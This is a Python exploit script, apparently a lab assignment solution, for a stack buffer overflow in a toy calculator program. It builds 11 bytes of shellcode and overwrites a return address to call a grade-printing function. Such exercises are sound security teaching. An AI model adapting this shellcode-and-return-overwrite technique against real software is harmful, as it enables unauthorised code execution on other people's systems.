#!/usr/bin/env python3
"""Task 2: stack execution for attack/dark-calc.

Layout at input()'s epilogue (fixed stack):

    0x721000800fd0  expression[16]          <- shellcode starts here
    0x721000800fe0  saved rbp               <- we write 0
    0x721000800fe8  input return address    <- we write 0x721000800fd0
    0x721000800ff0  main's saved rbp        <- exit@plt trampoline
    0x721000800ff8  main's return address

Shellcode (11 bytes):

    push 4                 ; 6a 04
    pop  rdi               ; 5f
    mov  eax, 0x401a87     ; b8 87 1a 40 00  (grade_eval)
    call rax               ; ff d0
    ret                    ; c3

grade_eval(4) prints "Hope A will be your grade!".  When it returns,
the shellcode's final `ret` pops 0x401880 (exit@plt) from 0x...0ff0,
so the process exits cleanly instead of crashing.
"""

import struct
import sys


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


shellcode = bytes.fromhex(
    "6a04"        # push 4
    "5f"          # pop rdi
    "b8871a4000"  # mov eax, 0x401a87  (grade_eval)
    "ffd0"        # call rax
    "c3"          # ret
)

payload = (
    shellcode
    + b"\x90" * 5              # pad expression[] to 16 bytes
    + p64(0)                   # input's saved rbp
    + p64(0x721000800FD0)      # overwrite input's return address -> shellcode
    + p64(0x401880)            # grade_eval's return address -> exit@plt
)

assert len(shellcode) == 11
assert len(payload) == 40
assert b"\n" not in payload

sys.stdout.buffer.write(payload)

